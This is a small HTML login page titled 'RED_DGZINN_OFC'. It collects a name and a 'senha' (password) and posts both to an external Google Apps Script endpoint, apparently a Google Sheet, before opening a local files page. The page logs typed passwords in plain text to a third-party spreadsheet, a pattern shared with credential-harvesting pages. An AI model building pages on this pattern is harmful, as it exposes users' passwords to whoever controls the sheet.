<!DOCTYPE html>
<html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RED_DGZINN_OFC</title>
    <link rel="stylesheet" type="text/css" href="./DG_files/styleofform.css">
</head>
<body>
  <div id="particles-js"><canvas style="width: 2%; height: 2%;" width="1920" height="940"></canvas></div>
  <script src="./DG_files/particles.js.download"></script>
  <script src="./DG_files/app.js.download"></script>
  <form method="post" autocomplete="off" name="google-sheet">
    <h1><img src="./DG_files/LOGO.png"></h1>
    <b>Name</b><br><br>
    <input type="text" name="Name" required=""><br><br><br>
    <b>senha</b><br><br>
    <input type="number" min="12" max="40" name="Phone" required=""><br><br>
    <button id="submitBtn" type="input">LOG IN</button>
  </form>
  <script type="text/javascript">
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwTt-afYDXuYU321g9nqGDvVgBbGi_LrASjCJ1nuqex4IFi7ZySuI8DLLhulf1ksBBKqA/exec';
    const form = document.forms['google-sheet'];
    form.addEventListener('submit', event => {
      event.preventDefault();
      document.getElementById('submitBtn').disabled = true;
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => {
          alert("You have successfully submitted.");
          window.open("DGZIN FILES 1.html", "_self");
        })
        .catch(error => console.error('Error!', error.message));
    });
  </script>
</body></html>
